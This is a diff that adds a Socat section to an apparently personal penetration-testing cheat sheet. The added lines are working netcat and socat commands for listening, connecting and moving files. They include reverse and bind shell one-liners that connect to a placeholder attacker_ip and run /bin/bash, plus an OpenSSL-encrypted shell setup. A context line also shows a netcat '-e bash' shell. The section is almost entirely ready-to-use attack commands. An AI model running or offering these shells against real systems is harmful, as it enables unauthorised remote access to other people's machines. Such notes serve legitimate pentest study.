@@ -66,6 +66,60 @@ nc -nv ip port -e bash
 
 ## Socat
 
+1. netcat & socat
+
+```bash
+# listen on 80
+nc -lvp localhost 443
+socat TCP4-LISTEN:443 STDOUT
+
+# connect to  remote_ip:80
+nc remote_ip 80
+socat - TCP4:remote_ip:80
+```
+
+2. Socat File Transfers
+
+```bash
+# sender
+socat TCP4-LISTEN:443,fork file:xxxxx
+
+# receiver
+socat - TCP4:remote_ip:80 file:xxxxx,create
+```
+
+3. Socat Reverse Shells
+
+```bash
+# reverse shell
+## attacker
+socat -d -d TCP4-LISTEN:port STDOUT
+## victim
+socat TCP4:attacker_ip:port EXEC:/bin/bash
+
+# bind shell
+## victim
+socat -d -d TCP4-LISTEN:prot STDOUT EXEC:/bin/bash
+## attacker
+socat - TCP4:attacker_ip:port STDOUT
+```
+
+4. Socat with openssl
+
+```bash
+# generate a key
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+
+# combine .key and .crt into a .pem
+cat xxxx.key xxx.crt > xxx.pem
+
+# listen
+socat OPENSSL-LISTEN:port,cert=xxx.pem,verify=0
+
+# connect
+socat - OPENSSL:ip:port,verify=0
+```
+
 ## Powershell & Powercat
 
 ## wireshark
